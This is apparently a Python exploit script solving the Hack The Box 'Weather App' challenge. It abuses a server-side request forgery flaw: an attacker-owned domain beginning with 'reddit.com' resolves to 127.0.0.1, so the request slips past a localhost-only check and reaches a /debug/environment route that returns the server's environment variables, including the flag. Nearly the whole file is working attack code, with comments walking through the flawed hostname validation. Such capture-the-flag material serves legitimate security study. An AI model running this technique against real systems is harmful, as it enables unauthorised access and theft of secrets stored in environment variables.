import argparse
import socket

import requests

from sys import exit


def run_hack() -> bool:
    # If you look at application/util.py#35 you will notice that we cannot come from
    # localhost so this is why we use our custom DNS to fix the problem. You can also
    # see that is_from_localhost decorator is there to say that it has to resolve to 
    # 127.0.0.1.  We can also see in the Dockerfile#26 that we expose
    # TCP port 1337. Chaining this altogether gives us the exploit that will let
    # us see the flag.
    
    # We are trying to trigger application/blueprints/routes.py#27 with our malicous
    # domain. The 'proxy_req' function can be found at application/util#20. We will
    # return True on application/util#35 because application/util#8 is looking for
    # an exact match. We would have been blocked if the line read:
    #
    #  if restricted_url.startswith(socket.gethostbyname(url)):
    # 
    # This function is all sorts of broken. It is vetting just the host name and not
    # the IP Address. If it was just doing the hostname then it should have done
    # and exact match on 'reddit.com'. Secondly, it is comparing the url to 
    # application/util#4 which appears to be prefixes for private IP spaces. This
    # means that it should not have done an exact match but instead a prefix check.
    vulnerable_url = f"{base_url}?url={args.domain}:1337/debug/environment"
    headers = { "Accept": "*/*", "Connection": "close"}
    
    try:
        response = requests.get(vulnerable_url, headers=headers)
    except requests.exceptions.ConnectionError:
        print(f"[!] It appears that '{base_url}' is down... bailing")
        return False
    
    if response.status_code != 200:
        print(f"[!] Exploit failed, recieved status_code '{response.status_code}'")
        print(response.text)
        return False

    # Now that we received a successful status code we need to ensure the environment
    # was returned as a json per application/blueprints/routes.py#39
    try:
        flag = response.json().get("Environment variables").get("FLAG")
    except KeyError:
        print("[!] Exploit might have failed, you should check the code")
        print(response.text)
        return False
    except requests.exceptions.JSONDecodeError:
        print("[!] Exploit failed, we did not receive json output")
        print(response.text)
        return False
    else:
        print(f"[+] Exploit worked, found flag: {flag}")
        return True


def validate_preconditions() -> bool:
    # We have a vulnerability at application/blueprints/routes.py#26. it is 
    # looking for f'http://{SITE_NAME}{url}'. application/blueprints/routes.py#5
    # shows that SITE_NAME = 'reddit.com'. This is where the developer introduced
    # the vulnerability. The intent was that application/blueprints/routes.py#13
    # would allows be a HTTP path for reddit using the 'url' parameter in the GET.
    # 
    # What if instead, we made the 'url' parameter pass in a domain we owned such
    # as 'golden2.store'? What if we created a subdomain for our domain called 
    # 'reddit.com'? If we did that then we could pass the 'url' parameter
    # '.golden2.store' and this would force #26 to set the url to
    # 'http://reddit.com.golden2.store' instead of 'http://reddit.com'. 
    if not args.domain.startswith('reddit.com'):
        print(f"[!] Exploit won't work as '{args.domain}' needs to start with 'reddit.com'")
        return False
    
    # Now that we have the vulnerability in place, we need to get the flag which 
    # is set as an environmental variable in Dockerfile#32. We have a debug route
    # on application/blueprints/routes.py#31 which returns the system's environment.
    # Looking at application/app.py#8 that route will be '/debug/environment'. The 
    # problem is the decorator '@is_from_localhost' on application/blueprints/routes.py#32
    # makes it that we have to come from localhost. The only thing we have to do
    # is make the remote IP be '127.0.0.1' per application/util.py#15. So if we set
    # args.domain to be an A record that points to '127.0.0.1' then we can make
    # the rest of this exploit work.
    try:
        ip_address = socket.gethostbyname(args.domain)
    except socket.gaierror:
        print(f"[!] Domain '{args.domain}' does not resolve.")
        return False

    if ip_address != "127.0.0.1":
        print(f"[!] Domain '{args.domain}' resolves to '{ip_address}' and not '127.0.0.1'")
        return False
    else:
        print("[+] All precondition checks passed, I think we are a go for launch!")
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Exploit for HTB Weather App")
    parser.add_argument("-d","--domain", required=False, default="reddit.com2.golden2.store",
                        help="this is your hacked domain")
    parser.add_argument("-H", "--host", required=True, help="this is the host/ip to exploit")
    parser.add_argument("-P", "--port", required=True, help="this is the port to exploit")
    args = parser.parse_args()

    base_url = f"http://{args.host}:{args.port}"

    if not validate_preconditions():
        print("[!] Not attempting to exploit... bailing")
        exit(-1) # We did not setup the DNS record correctly
    elif not run_hack():
        print("[!] Exploit failed... bailing")
        exit(-2) # We were not able to craft the exploit correctly
    else:
        exit(1)  # Everything worked
